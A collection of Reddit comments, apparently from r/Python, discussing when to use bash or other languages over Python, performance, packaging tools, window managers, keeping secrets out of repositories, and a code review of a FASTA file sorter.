Hey, I didn't know you were on here. I've been following your Django tutorials and they've been a huge help. Thanks!
Or a bash one-liner. You can do a pretty incredible amount of stuff in one line that would be a paragraph of code in Python. Editing and executing on the fly makes it super productive. And if it's a one-time thing, no one can shame you about readability.
Great, glad you like them. I should really update the Django series, but Flask has my heart! Took me a long time to digest web dev in Python at all, but definitely very rewarding.
Oy vey, I never did a line count on my code. . . at least several hundred lines. Several hundred lines too many.
It does, but you would probably want to use powershell on windows these days. That's actually rather nice.
I knew the thing about `[`, but the way you articulated the command/assignment paradigm really make sense, thanks.
I once wrote a script in python, and then wrote it in BASH. Bash was only 20 lines long, but my python script was about 90. Either I suck at python, or bash was the better tool. I'm assuming both.
It's typed, but not strongly. You can pass any type you want as any parameter you want. You can assign any type to any variable. Strongly typed means, I believe, error messages when you do stuff like that. That being said, it's there is no precise definition. That being said, I think python is getting improved features in that area anyway.
Even for semi advanced ones, I tend to prefer shellscripts. Take something as simple as to generate a self-signed certificate. A fork to openssl commandline, vs. doing it with python pyOpenSSL or similar? Don't go there. The python code basically ends up calling the same commandline as the shellscript, in ~5 times as many lines. Especially true if you do something with trap /cleanout in shell and try to emulate behaviour in python. oh my god.
Can you even emulate trap + set -e ; in python?
My issue with scientific python has nothing to do with the IDE...
&gt; It's been getting there for years now If I understand correctly they don't actually get the funds they needed to develop it faster, hence the slowness.
Basically it works for any kind of variable. However the .env file is read as text and if you set the variable there , for example, as True, python-decouple would read it as the string 'True', not the boolean True. To change this behavior you can use cast: DEBUG = config('DEBUG', default=True, cast=bool) **Update w/ examples** I'm working on a project (*work in progress* yet) that has a [config.py](https://github.com/cuducos/findaconf/blob/master/config.py) and a [sample of what a local .env should look like](https://github.com/cuducos/findaconf/blob/master/.env.sample) and a [read me explaining most of the variables](https://github.com/cuducos/findaconf/blob/master/README.md#environment-variables).
I was just looking at Bokeh yesterday while struggling to find a decent Javascript plotting solution. From what I saw of 0.7, it looks promising, but still not exactly what I need (namely I wanted to have the client update a plot based on server-sent events). Looks like they're heading in this direction a bit.
&gt; If the project description has the word "embedded' in it you will most likely use C or C++ Nope/depends. There's a MicroPython project, basically a Python 3 on Cortex-M4. Looked quite usable the last time I checked. However, there's a higher chance of seeing Lua than Python in embedded. &gt; If you need performance (major games, high speed science) you will most likely opt for C or C++ (partly the reasoning for #1) Nope/depends. Numpy anyone? Or other high performing C/Fortran libraries with Python glue. Actually, it's a quite common model where you have a compiled to native backend, with a scripted facade. Take ns-2 and ns-3 network simulators for example, where ns-2 used Tcl, while ns-3 has migrated to Python. 
Are you talking about pypy here or numba?
That is pretty awesome. I can't believe I hadn't heard of that before.
Yeah that's really painful. If I get above 100 lines I would outsource at least part of it into other languages.
For web browser client side programming there is not choice, the only choice is ~~Javascript~~ ECMAscript (No browser calls it javacript officially since Java is an Oracle trademark. For embedded systems with limited memory and resources, also there is few choices, you can only use Assembly, Forth language or C. For quick calculations, Excel or Spreadsheet. For simple system tasks, I would use bash script. For High performance applications, create C library and bind it to python, or create the application in Haskell. For an mobile app in Android OS ~~(crippled lock down Linux)~~, you can only access the API through the "java" (dalvik) library or using socket RCP calls like Android SL4A does. The sandbox model and the lack of default root shell access makes the interactive development harder, however it's still better than IOS. 
Indeed, but 95% of the time at the point in your project where you think about porting that one-liner to `./former_oneliner.sh` and break it out into `if` or `case` statements or complex `sed` or `awk` you're probably better off doing `python former_oneliner.py` instead. 5% of the time you gotta though, I know, shebang away.
 import tempfile with tempfile.NamedTemporaryFile() as f: # do stuff with f here, if we get interrupted Python will throw an exception, unwind the stack, and the temporary file gets cleaned up print &gt;&gt;f, "asdasd"
I usually don't make that transition. My shell antics tend to stay in the shell and don't serve any long-term purpose in a project. But when they do, you're right, it's usually best to just go straight to Python, instead of a bash script.
When I need throughput that's bottlenecked on the CPU. This often isn't an issue because of caching, smart clients, etc, and the option to implement something natively _does_ exist, but if I'm worried about crunching network responses quickly I'll reach for something else. If I do I'll use something with good threading support too. Context: Networking in Python is awesome and can be really scalable with async approaches when my bottleneck is I/O. Just not when it's actual processing power. 
Hylang! That's the one I was trying to remember to look for examples. I was considering exactly the approach you're suggesting. If I can build ASTs that match Python's structure with the `ast`/`parser`/`compiler` libraries, it should be trivial to output Python bytecode, correct? With that approach, I can build the entire codebase in Python, and the largest part of the project I think would be to develop the parser that would generate ASTs for it.
As a data scientist, it's good to have multiple tools in your box, and both Python and R should be there. I found Python somehow more convenient when it's time to integrate some data analysis component with a bigger picture, e.g. a more complex data pipeline or some web-oriented backend based on Django, but this is purely a personal opinion. The support for Natural Language Processing is also much better in Python with NLTK. A particular case when both (in my opinion) fall short is dynamic/interactive data visualisation, and this is when e.g. Javascript kicks in (just to repeat the first statement about being familiar with multiple tools)
Still nothing compared to optimized C code that makes use of advanced SIMD extensions and the like.
I would quite honestly tackle any job in Python. Only after getting a full version of something and finding out that component X is performing to par in Python would I seek alternative and possibly write said component in another language. I would look into CPython or pypy first though. Nowadays the only time I put Python aside for anything is when one of customers asks about an old application I wrote in my pre-Python days.
grep, awk, and sed in the same pipeline is almost always a sign that someone doesn't know how to use sed or awk properly. If you want to only to do regex find/exclude then use grep. if you want to do some simple stream editing use sed; it can also do any of the things grep can do. if you want to do some editing or stateful transforms then use awk; it can also do any of the things that sed and/or grep can do.
If I had to script in windows, I would just install Gow or Git bash...
Mongo is schemaless and as such very easy to setup and then alter going forward. Great for prototyping. Not great for sanity in the long run. Many people seem to use ORM's to enforce schema on top of Mongo in the application layer.
I've been looking into llvm. It's a bit of a learning curve, but it looks like a great way to go. If not now, I at least want to eventually play with it. However going from an arbitrary language to LLVM IR would separate my project from Python completely regarding the VM, right? From what I've read, it looks like that approach is best for generating machine code from llvm IR or even java bytecode. I haven't found anything to go from LLVM IR to Python bytecode. TBH I'm a bit torn between generating machine code and Python bytecode. On one side, I want to learn Python bytecode in and out and be able to import existing third party python modules into the language and easily use them. On the other side, it's pretty cool to be able to compile down to machine code, or even create your own runtime environment.
pypy, much of numpy is supported. numba is a no joke improvement for Cpython, but pypy optimizes well generally in most areas and using numpy basic features is very possible ... for me .. so far ... even on arm servers...
My best jokes are typically unintentional. I'm thankful that I don't make a living as a comedian.
These all may be faster than Python, but is the developer productivity as good as you could get with Django? Most of them seem to be aimed at a lower level. 
When I need to deploy projects on server I use Capistrano. It is ruby-based tool. Capistrano works simple and quite fast to configure.
When I'm forced to use Java my professors :^)))
That's what's happening, actually! The bash scripts were for controlling a distributed testing system, and now I'm going to do it the right way with Python and 0MQ.
One nice thing in Cython is that it's fairly easy to use native C libraries directly. If a particular part of your code has to be as fast as possible, you can write that part in C and it's very easy to integrate it into your Cython project. Cases where this is actually necessary are pretty rare though.
Yeap. And with subprocess and others? Afaik a sigkill won't execute a trap, will it?
Obviously I &lt;3 conda :-) conda is most well-known in SciPy and PyData circles, but it actually is very useful for webdevs and "regular" Python developers as well. conda packages and environments are multi-language, and thus you not only get robust management &amp; isolation of native shared libraries (e.g. image libraries, lxml, db drivers, etc.), but you can also create packages for node and front-end stuff. Check out http://conda.io/
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Server-sent events**](https://en.wikipedia.org/wiki/Server-sent%20events): [](#sfw) --- &gt; &gt;__Server-sent events__ (__SSE__) is a technology where a browser receives automatic updates from a server via HTTP connection. The Server-Sent Events EventSource API is standardized as part of [HTML5](https://en.wikipedia.org/wiki/HTML5) by the [W3C](https://en.wikipedia.org/wiki/World_Wide_Web_Consortium). &gt; --- ^Interesting: [^Push ^technology](https://en.wikipedia.org/wiki/Push_technology) ^| [^Origyn ^Web ^Browser](https://en.wikipedia.org/wiki/Origyn_Web_Browser) ^| [^ItsNat](https://en.wikipedia.org/wiki/ItsNat) ^Parent ^commenter ^can [^toggle ^NSFW](/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+cooh4xt) ^or[](#or) [^delete](/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+cooh4xt)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
Python compiles into C, and if one knows enough C and enough python, there is virtually no advantage (what i mean is, if you know how the code will compile and how, you can write python that is only 8-10% slower than C in virtually all cases, including implementation of a lot of MC /MCMC algorithms).
I could not agree more
Well, from my experience, for everything that is not prototype. I find Python great when I have to test some theory, and even if it building prototype take some time, it's the quickest way to do. But when you need to create application which has to be fast, then you can forgot about it. Unfortunately, I have worked with some people who do everything in Python, and a lot of application has suffered because of slow execution time in Python, when it could be a lot faster in some another language (C++, Java, and others). As for non-python languages, Java and C++ are first on the list for some non-web, or non-desktop application. Because mostly app has to be quick, and work on a lot of data (for example: parser has to parse at least 1gb/min which is not possible when you do app in Python). edit: and yes! Types! How many times I have cursed Python because there was bug with types, and it's only happening in some certain cases. Definetly, you can prevent that, but I definetly prefer when something is type int, long, string, ... and I know for sure it is that type. In big projects, without proper documentation, or with bad variable naming, this can become serious problem.
Rust. It seems interesting.
Does IronPython has that easy-way-to-create desing like VS? I have create some GUI apps in python, and C# + VS is the most easiest way to do app, quickly and without any pain. 
if the github repo is public, you absolutely cannot allow your SECRET_KEY to be present in that repo or else every site you've deployed using that secret is compromised. similarly, do not include any kind of private or identifying information such as credentials to third party APIs that are your own personal credentials. 
Go, Rust, perhaps Swift
Also for more sophisticated numerics, like sparse linear algebra, or robust optimization. Even if the problems are small enough for the interpreter to not be an issue, generally fortran, C++, C and matlab will have the mature scientific libraries over python.
Compiled and statically typed
Have you looked into using [mypy](http://mypy-lang.org/) for static analysis?
Bottle is my favorite of the one I have played with, by far.
I use Python for web services, scripts and prototyping. I won't use python to code games or OpenGL heavy applications.
I'm a big fan of qtile and start it up once in a while, though I keep i3 as my production window manager. They seem to be ramping up for GSOC this summer, so I'm hoping the project does well. I especially like the config setup and it has served as some inspiration for part of a project I'm working on. ini/json/yaml/custom config files are easy to write and use, but there's nothing quite like a config written in the code base's language (well unless it's C...who wants to compile their config?) I'm sure the xmonad folks feel the same way. For those using i3, by the way, there is [i3pystatus](https://github.com/enkore/i3pystatus), which has a somewhat similar style of config to qtile that is immensely more flexible than i3status. The best part is you can just write your own status widget classes and use them in your config. Qtile can do that with not just status widgets, but the whole WM. Want some custom tiling layout? Just define one. It's wonderful.
Thanks for the advice, I'm just now getting the chance to look into your recommendations!
I switched to C to speed up cryptanalysis, but in the end I screwed up a hash table that may have slowed it back down to python speeds. I wonder if had I stuck to python the end result would have been the same.
Would you mind sharing your config?
I made myself a library to get such pipes operator: [https://github.com/remy-j-a-moueza/fun-kernel](https://github.com/remy-j-a-moueza/fun-kernel) The pipe operator is "&gt;&gt;" (it makes it close to Haskell's &gt;&gt;= operator), the function call operator is "|" and sections are implemented with "op" or "rop". There is also mmap, ffilter the alter egos of map and filter, and some little convenience functions. The code you describe can be translated as such: define even: something modulo 2 is not equal to 1 (The argument is implicit). &gt; even = (op % 2) &gt;&gt; notV **[1..10] |&gt; filter even |&gt; reverse |&gt; take 3**: A function encapsulated with my F magic class can be called partially with the indexing operator. You can chain the index operators to make a partial call with several argument: fun [arg1][arg2][arg3] &gt; ffilter [even] &gt;&gt; get [::-1] &gt;&gt; get [:3] | range (1, 11) [10, 8, 6] You can alias "get [::-1]" as "reverse": &gt; reverse = get [::-1] &gt; ffilter [even] &gt;&gt; reverse &gt;&gt; get [:3] | range (1, 11) [10, 8, 6] **[1..10] |&gt;&gt; (^2) |&gt;&gt; (/10) |&gt;&gt; (+100)**: We can do sections with the "op" function. For string section, on can use the reverse op: "rop": mmap [rop % "%d!"] | range (1, 5) =&gt; ['1!', '2!', '3!', '4!'] &gt; mmap [(op **2) &gt;&gt; (op /10) &gt;&gt; (op +100)] | range (1, 11) [100.1, 100.4, 100.9, 101.6, 102.5, 103.6, 104.9, 106.4, 108.1, 110.0] **[1..10] ?&gt;&gt; even**: &gt; ffilter [even] | range (1, 11) [2, 4, 6, 8, 10] You can still call the function with parentheses: &gt; ffilter [even] (range (1, 11)) [2, 4, 6, 8, 10] It works best when designing an algorithm in a REPL, starting with a small one liner that grows gradually, trimming it down regularly as some blocks between the piping operator "&gt;&gt;" get aliased as functions (like I did for the "even" and "reverse"). On can get to solution step by step, visualising the data being process all along the way. It can get things done without writing a one off script or help get an idea of how to handle some data before resorting to some more idiomatic code. However, abstractions have a cost in Python. A line like: mmap [fn1 &gt;&gt; fn2] &gt;&gt; ffilter [cond] | data will be slower than the idiomatic Python: [fn2 (fn1 (x)) for x in data if cond (x)] It will be also harder to debug, when one of the function within the pipe is fed with an argument of the wrong type it will break with a stack trace like this: Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt; File "/home/ray/lib/kernel.py", line 57, in &lt;lambda&gt; __call__ = lambda s, *a, **k: s.f (*a, **k) File "/home/ray/lib/kernel.py", line 54, in &lt;lambda&gt; __rshift__ = lambda s, g: F (lambda *a, **k: g (s.f (*a, **k))) File "/home/ray/lib/kernel.py", line 54, in &lt;lambda&gt; __rshift__ = lambda s, g: F (lambda *a, **k: g (s.f (*a, **k))) File "/home/ray/lib/kernel.py", line 39, in &lt;lambda&gt; lambda *fa, **fk: f (*(ca + fa), **updated (ck, **fk))) File "/home/ray/lib/kernel.py", line 135, in &lt;lambda&gt; flip = lambda f: lambda *a, **ks: f (*a [::-1], **ks) TypeError: unsupported operand type(s) for ** or pow(): 'list' and 'int' which does not give the function block wherein which the error occured (in that case I tried to compute "(op ** 2 ) &gt;&gt; (op /10) &gt;&gt; (op +100) | range (1, 11)": the chain here must be put inside a "mmap []" call. It can looks so unpythonic that it'll give nightmares to the non-initiated: &gt;&gt;&gt; concat = F (flip (sum)) [[]] &gt;&gt;&gt; concat | [[1], [2], [3]] [1, 2, 3] So, Python has the flexibility to allow for some mathematical elegance, but does not help much in making it practical. On the other end, this kind of function piping exists in Ruby (with builtin methods) and D (through UFCS - Nim should also support it but I don't know enough of it to say much here) and in my experience, have been really more convenient. IMHO, extending the builtin list, set and dict types with some map(), filter and reduces/collect() methods as in Ruby would work better than any standalone operator but Python's philosophy being so attached to the imperative programming paradigm, this will certainly never happpen. You can still enjoy Hy. 
Since I am having similar issues with Python at the moment, I would be very interested to hear how you deal with the maintenance of such a large code base in Python? What are you best strategies to deal with it? (Besides switching to Go ;))
I would guess that one advantage is that QTile is configured using Python, rather than Haskell. Not being cheeky, but I'm sure a lot of us would find Python easier to use than Haskell, especially if you say you find the configuration difficult.
Adding on to say not only in the repo but, the local git history. If you locally committed a SECRET then reverted it, then pushed remotely someone else can revert that commit as well. If you ever locally commit a SECRET you need to rebase before that commit before remoting. 
I will likely be in our booth for most of the conference --- when I am not infiltrating other less Pytyonic booths.
and 0.0000000000% sourceforge, cause screw those guys and packaging in crapware.
well the ship of complaining about the posix shell syntax and its derivatives has sailed decades ago. Yes it would be nice to get a nice modern shell, but the problem is that without the compatibility with all the legacy cruft in existence it's dead in the water. There are some shells where certain things are done in a nicer way, almost nobody uses them. Also there are things like let x=y or what have you, but majority of people don't bother and you can find such things only in very old scripts. I certainly never bothered and i wrote my share of rock solid bash scripts just fine. about $: think getter, done. Also given that the shell is a plaintext based, ancient beast and literally does a preprocessing pass with substitutions, it would be hard to use $var in assignments. When it comes to the actual interpretation/run, no $ sign is to be seen. and the export bit. The difference is that in case of `envvar=x a` envvar change is localized only to the `a` command which is not possible if you split it to 2 expressions. It's preferable than setting globally (which comes with the risk of not unsetting later), useful in cases like this IFS=. read ip1 ip2 ip3 ip4 &lt;&lt;&lt; "122.11.123.44" everybody knows playing with IFS can have nasty consequences because all kinds of things are affected by it, and by writing it that way you leave it alone. Only `read` is affected here, think ip1, ip2, ip3, ip4 = '122.11.123.44'.split('.')
Lua 
You might want to check these modules: [sh](http://amoffat.github.io/sh/), [sarge](https://bitbucket.org/vinay.sajip/sarge/), [plumbum](http://plumbum.readthedocs.org/en/latest/)
Clojure, Erlang, Lisp
Yeah, PySide is quite poorly documented. That being said, I use it every day, and it's quite usable. It's basically a wrapper around Qt, so you can reference the Qt docs for almost everything. The rare exception is something that's inherently different in Python (such as connecting signals), and PySide does have documentation for those exceptions. You really only need a learn a small handful of PySide-specific stuff, then you can stick to the Qt docs. We used to do all our Qt programming in an imperative fashion, just like you do with wx. Now we exclusively use Qt Designer to generate .ui files and compile them as part of our build process. It's so much better!
I don't really agree. I work for a company whose main product is a Python application that does modelling and simulation using Monte Carlo methods (among others), and it works fine. As you noted, we don't do the low-level math in Python -- it's all done with numpy/scipy -- but that covers nearly everything we have ever needed. We built one small C extension for the one thing that numpy/scipy didn't provide. But for all the rest -- which makes up well over 95% of our code base -- we use Python.
TL;DR Please break up your paragraphs to fix the wall of text. wowza...
Basically the behavior of the numpy.ndarray is much less intuitive to me than R datatypes http://www.reddit.com/r/Python/comments/2w64e2/when_do_you_not_use_python/coo3sen
Sorry about that :( Edited it to look nicer, thanks!!
I use conda, and if I cannot find what I'm looking for with binstar (binstar allows to search for custom conda packages by individual users), I'll resort to using pip. For some things (say, PyGame) I'll use a binary (as I'm windows)... I think I've used github a handful of times... Conda: 98% Pip: 2% Github: epsilon
You can't use concurrency to get parallelism ever, that's impossible no matter what language you're in.
Note to self: Pythonistas do not appreciate facetious humor.
Julia. I don't know what future it has, but it's interesting. And scala, for some reason.
&gt; To avoid ambiguity, you might have something like: &gt; &gt; No...what happens when you have a program called var?
As someone who's spent the last week writing SIMD, fuck SIMD.
I really like the look of _ as a throwaway variable, I never would have thought of that. Nice article, thanks for sharing.
&gt; I understand that Python /is/ a strongly typed language. Python is often referred to as strongly typed within the context of other languages that are much looser with their typing (Perl, PHP, and bash to name a few). Python has a few weak spots (pun intended), mostly with booleans. For example `if object:` is an idiom some people like to use, when often they mean `if object == None:`. This breaks down in a few rare cases, like when object is a `time(0, 0, 0)` aka midnight. Another, probably more common, case for this to break down is where a string can be treated as an iterable of strings and its fairly easy to accidentally iterate on the wrong thing and not realize it. That said, stronger typing means more explicitness, and that has its downsides too.
That's almost literally [the example given in the signal documentation](https://docs.python.org/2/library/signal.html#example): import signal import tempfile def handler(signum, frame): raise RuntimeError("Got SIGUSR1") signal.signal(signal.SIGUSR1, handler) with tempfile.NamedTemporaryFile() as f: print f.name while True: pass
It will work. Or you can use sh (http://amoffat.github.io/sh/), it's wonderful to easily create subprocesses.
That's sort of what I'm inclining for here. You manage to replace a 2-line shellscript with how many lines? And you're not even catching _all_ the signals yet? Still have to iterate over them all and trap. In a lot of cases, Python is just a bloody ton more verbose, and not quite suitable.
&gt; And then you call that numbercrunching? Sure, because that's what it is. &gt; Java offers lots of great things... Java doesn't offer anything specifically great for math. &gt; But you can't really take Java out, because it can do everything as Python can. So can Brainfuck.
Considering how little a tiling WM does I'd be shocked if it was a noticeable difference.
Agreed, I've never thought to use it in Python (mostly because I rarely run across cases where a different call wasn't more suitable anyway). But some languages build this in as a throw-away, such as Go. It's a nice feature for sure!
go back in Java and perhaps javascript for server side :3
Qtile? More like Futile! /badjoke
There are actually several languages which use that syntax as a basic data construct, eg. LISP, Haskell, and especially Prolog.
Yeah, I frequently use that if I iterate on a list of tuples and only need one or two elements. Pretty useful, and it makes it obvious what you're wanting to work with in that scope. for first_name, _ in full_names: print('Hi, {}!'.format(first_name))
One of them once told me (extremely smugly) &gt;When you *really* think about it, it makes sense that a 2d histogram inherits from a 1d histogram. God damn it I hate ROOT.
I started to learn Haskell a short while ago and it provides a really interesting new perspective about programming. You can learn functional programming and a statically typed language at the same time, so you have a good contrast to what you do in Python. I have already become a lot better with recursion, because there are no for and while loops in Haskell and you have to use recursion all the time.
I'm a physicist doing engineering electromagnetics, and I can't tell you how many times I've gotten asked "So do you work on that Higgs boson thing?" On the one hand, I appreciate what CERN does for science awareness, but on the other, pettier, hand, I hate how they've hoodwinked the public into thinking they're the end-all-be-all of science research. Particularly when &gt;their work has no relevance to reality (the subjective reality of a lay person).
You can write a complex program in Cython much, much, much faster than you can write that same program in C, and usually without meaningful performance costs since performance is usually determined by the slowest step (which you can implement in C). Better still, the Cython code will usually be more readable and maintainable.
Fortran is made for numerical computations, so if you want to use multiprocessing then it's a good choice, but outside of serious math, I'd stay away. It's great for what it does and it's easier than C or C++. It's was made for non-programmers. I try to stay as far away from vi as I can. I can use it, but haven't figured out how to really use it efficiently or work with plugins. Never tried Emacs. I'd much rather use gedit/Textpad, but typically use WingIDE on Windows.
Scala is the next one for me
Be very careful with calling external programs, especially with shell=True. This can pose a very serious security risk if a user has any way to control the string being passed to the shell. 
i would consider this using fortran, with python as "glue". not using pure python per se
checkout forecast.io - they have an api with 1000 free calls per day
trying hard to turn off my snob mode here, but learning emacs or vim properly will really change your life 
I guess my somewhat limited experience is that when algorithms are truly serial like Markov chain monte carlo, it is nearly impossible to get good performance out of pure python / numpy. This is opposed to generating a thousand gaussian RVs or something embarrassingly parallel like that.
I guess the first use is okay in an interactive session, but I hope to god it never bleeds over into scripting. It reminds me of the rat's nest of special variables in Perl and Bash.
...5GB of spreadsheet... The problem isn't Python, it's everything else! Let me guess, banking.
Note - haven't run/tested/measured any of this - just went through the code looking for things that stick out. As a minor thing, stuff like: seq += [line.rstrip()] would be better written as just seq.append(line.rstrip()) There's no need to create a temporary list just to concatenate it to another one and throw it away, and there are a couple of places where you're doing this. As a style issue, I'd probably not bother with the chunk variable at all - just create the tuple when you're yielding - having that 2 element list with a placeholder, then modifying it before writing isn't as clear as just: seq_id = None seq = [] for line in infile: if line[0] == "&gt;": if seq_id: yield [seq_id, "".join(seq)] seq_id = line.rstrip()[1:] # omitting the leading &gt; seq = [] (I'm assuming the sequence id you mention is the bit after the &gt; - not familiar with the format. If not, a different name would be better). However, I don't really see anything in the generator that would result in the slowdown you're seeing, so moving on to the sorter: tempfiles += [open(os.path.join(tmpfolder, "".join([basename, "_", str(tempfiles_counter).zfill(4), extension])), "w")] I'd break this line up a bit - you're using the file later as tempfiles[-1], so really, you should give it it's own variable (and again, use append rather than +=). Also, wouldn't it be clearer to store the filename, rather than the file handle in the list? The only thing you use the list for is to reopen the file by name anyway, so something like: tempfilename = os.path.join(tmpfolder, "{}_{:04}{}".format(basename, tempfiles_counter, extension)) tempfiles.append(tempfilename) with open(tempfilename,'w') as tempfile: tempfile.write("&gt;") tempfile.write(chunk_read[0]) tempfile.write("\n") tempfile.write(chunk_read[1]) tempfile.write("\n") The with syntax will automatically close your file when you're done with it, so no need to call .close, and it'll also close the file if you get an error. I've also changed to using a .write() for each element, rather than concatenating it first to avoid the cost of creating the temporary string in memory. Your merge step looks like a good candidate for performance improvements - you're reading a number of chunks from each file in advance, culling the empty ones, and then looking at the first from each generator. I don't think there's any gain in reading more than one item in advance from each generator at a time, and you're doing a few fairly slow things like: `smallchunks.index(min(smallchunks, key=sortkey))` - here min is doing a scan to find the smallest item, and then you're doing the same scan to find the index of that item you just found. I think you could simplify this whole thing fairly drastically. You want to take each iterator, look at the first item of each, find the smallest one, then pop it and add the next item from that generator. If you look through this linearly, and find the minimum each time, you'll be redoing a lot of work, as only a single item will have changed. There's actually a data structure tailor made for this sort of usage called a [heap](http://en.wikipedia.org/wiki/Heap_%28data_structure%29), which maintains an invariant that the top item will be the smallest item in the heap, and maintains this through inserts much more cheaply than doing a linear scan every time. Python has this builtin in the heapq module, and even better, there's actually a function that will do **exactly** what we want here - take a list of iterators, and return an iterator that gives the merged items in sorted order. It's called heapq.merge. As such, I think you can replace your whole else part with: else: # standard case sys.stdout.write("Merging temporary files into sorted output file\n") outfile = open(outputfile, "w") generators = [fasta_file_read_generator(tempfile) for tempfile in tempfiles] for chunk in heapq.merge(*generators): outfile.write("&gt;") outfile.write(chunk[0]) outfile.write("\n") outfile.write(chunk[1]) outfile.write("\n") A **lot** simpler, and it should be significantly faster (though again, haven't measured, so take that with a grain of salt - maybe this isn't the costly bit). Still, the simplicity gains alone seem well worth it even if it has no performance impact. (One downside is that merge does not take a key parameter, however you can do this yourself by wrapping each generator in one that yields (keyfunc(chunk), chunk) before passing it in (and unwrap it afterwards). Ie: def wrap_generator(keyfunc, gen): for chunk in gen: yield keyfunc(chunk), chunk generators = [wrap_generator(fasta_file_read_generator(tempfile)) for tempfile in tempfiles)] for key, chunk in heapq.merge(*generators): # as before - key being first ensures they are in sorted order of that key. That's the most obvious stuff I see after a quick pass, though there may be other things worth improving. However, as a more radical change, have you considered generating only the file **indexes**, rather than the contents of each chunk? You may be able to do the whole thing in memory this way, unless the names themselves are sufficient to exhaust memory. Ie. the idea here would be that your generators give you: `[sequence_id, start_pos, length]` Where start_pos is the .tell() locations of the start/end of each chunk (NB: you'll need to process the files in binary mode for this to work - which may complicate things wrt line endings, and maybe even unicode handling if that's used by the file). Sort this sequence, and then go through it in order, `seek()`ing to the appropriate position in the file and reading `length` bytes, then write that out to the output file. Ie: chunks.sort(key=keyfunc) for seq_id, startpos, length in chunks: infile.seek(startpos) chunk = infile.read(lenth) outfile.write(chunk) In the event where you still can't fit all this in memory, you could likely still speed things up by making your tempfiles just indexes containing this data, rather than rewriting the entire contents of each chunk. [Edit] Haven't really looked at your old function much, but in a quick glance I noticed that it is doing stuff your newer one doesn't, such as stripping out comments. If there are a lot of these, that could be related to your difference - if it doesn't preserve comments, it may simply be writing less data out, saving time that way.
Clojure, D and Nim.
When I found myself writing map/reduce in JavaScript so I could query on something other than the unique key, I was ready to smack someone.
I would like to explore Java. Java is intriguing with its JVM feature. 
I been interviewed for quite a few of those and for most of them you are required to be there for 3/4 of the project. So unless you are located in GB it's going to be a hassle. (For the record: *Python in test automation* was the subject of the interviews)
It's not your brain that needs fixing; Python is one of the most dynamic languages out there, and what you describe is a real and fundamental problem. That doesn't make Python a bad language, and there are lots of benefits to this dynamic nature (Python is as popular as it is for a reason), but it means you need a few mitigation strategies to stay on top of things. One of these strategies is documentation. Document everything you write, particularly the kind of information you would normally put into types, `const` modifiers, etc. - unlike C++, the Python interpreter will not help enforce these, but at least you can access this information through a REPL like `ipython` or just plain `python` (in interactive mode). Another strategy is automated testing. If you make a habit of writing unit tests for everything (which is fairly low-threshold with libraries like Nose), they can make a decent enough substitute for explicit type annotations and such, and if you write your tests right, just keeping a window open that constantly runs all your tests and displays the results makes for a really nice development workflow: add a test, save, see it fail; change your code, save, see the test pass again. And then there's coding style and choices. You are right in that there are different ways of doing things, and often it doesn't really matter a lot which one you pick, but keep things consistent. Naming conventions also go a long way; it's a good idea to internalize accepted standards like PEP-8, if only to keep your code in line with other people's work.
`namedtuples` are a nice alternative to that.
Fun fact: _ as a throwaway variable shows up in OCaml where it is [used as a catch-all wildcard in pattern matching](http://caml.inria.fr/pub/docs/oreilly-book/html/book-ora016.html).
That sounds horrendously complex though, I am pretty sure lots of people make mistaken posts which later get deleted by the mods.
You created a brand new account just to post a C+P of what is likely a homework question, with absolutely no effort or context on your part? Classy. I haven't been on this sub long, but as I understand it they're considering banning homework posts, and I'd imagine this is the reason why. But hey, I'm guessing if you created a new account just to post this you probably knew that too -_-
It doesn't work only because I outsource parts to C, it works because I architected the whole thing so I could outsource the 1% that actually matters to C (if required, not always). That is not a failure of Python, but validation of my structure and of a language that has a sane native code interface story (and also a validation of other 3rd party libraries that use ndarray as their data models). I think you would be surprised what you can do with the correct architecture. I write real time computer vision applications in Python for a living.
To be honest, it sounds to me like you're just not used to the language. This is not Python-specific - whenever you're introduced to a new language, you'll have a couple of weeks when you feel as if you program with your hands tied behind your back. I remember myself when I was introduced to C# after using C++ exclusively. "Where's my std::map? Why can't I find a red-black tree anywhere in the docs?". Use it enough to develop idioms and usage patterns of your own (e.g numpy arrays for something you'd like to multiply by a matrix, a Python list for everything else), don't be afraid to make mistakes, and in a couple of weeks you'll be comfortable back again :-) Good luck!
I doubt that the tracking you are using is particularly new or novel (tracking things with markers). I suspect you could have made it fast enough and kept your application in python through designing things a little differently.
I think this post would be better suited to /r/learnpython
Not at the moment, but I'm planning to release a web application example next week. If you'd like, I can let you know when it's available.
Hi there. You have posted a beginners question to /r/python, however it is far more suited to /r/learnpython, where users are actively interested in helping with beginner topics. Please resubmit it over there! Make sure to read their sidebar rules before posting, notably this one: "Posting homework assignments is not prohibited if you show that you tried to solve it yourself." Cheers &amp;amp; best of luck!
C# dotNet has recently been opensourced and even builds on OS X now. Out of curiosity I am learning it. 
&gt; I would also assert that Python is 7-8x faster to write than C++ and Java. :) Exactly - most of the time processing time doesn't matter, and when it does, you'll be glad you've got a working proof-of-concept in python :D
I really hate _. As someone who never saw it before I was completely confused as to its purpose, where it came from, and how it's used. It doesn't feel pythonic at all to me.
Sure, will do that. Thanks
No schema migration yet. It uses sqlalchemy under the hood, and I'm planning to integrate alembic.
&gt; ab-initio quantum chemists What *is* this field about? 
Hi there, /u/StrahansToothGap. You have posted a beginners question to /r/python, however it is far more suited to /r/learnpython, where users are actively interested in helping with beginner topics. Please resubmit it over there! Cheers, /r/python mod team
it does. I am talking about the config, which I have to adjust and i didn't manage that yet... But the wm is very well documented(better than i3wm in my opinion) so i am confident that i will make it work at some time. 
no. I haven't noticed anything yet.. But i am running on 12 GB of ram an i7 and a ssd so i would be shocked if i had noticed anything...
Maybe for your definition of parallelism. For the definition me and the previous poster are talking about, we're talking about being able to run tasks in parallel, and concurrency means being able to effectively split a program into those tasks.
Yes, I’m using backticks for throwaway scripts, in general programming I don’t use them :)
Replaced _ with x. It's not very descriptive, but if it's only used directly after where it's defined it should be clear what it's used for. Unless you're using x later on the program.
The rule for mangling is "at least two leading underscores, at most one trailing underscore"; that's why they don't get mangled.
